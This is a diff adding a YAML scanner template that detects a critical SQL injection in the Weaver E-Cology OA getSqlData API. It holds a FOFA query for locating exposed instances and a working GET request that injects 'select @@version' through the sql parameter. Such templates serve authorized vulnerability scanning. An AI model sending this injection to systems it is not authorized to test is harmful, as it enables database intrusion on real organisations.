@@ -1,0 +1,18 @@
+id: e-cology-getsqldata-sql-inject
+
+info:
+  name: 泛微OA E-Cology getSqlData SQL注入漏洞
+  author: zan8in
+  severity: critical
+  description: |
+    fofa-query: app="泛微-协同办公OA"
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getSqlData%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
+        expression: response.status == 200 && response.body.bcontains(b'{"api_status":') && response.body.bcontains(b'"status":true}')
+expression: r0()
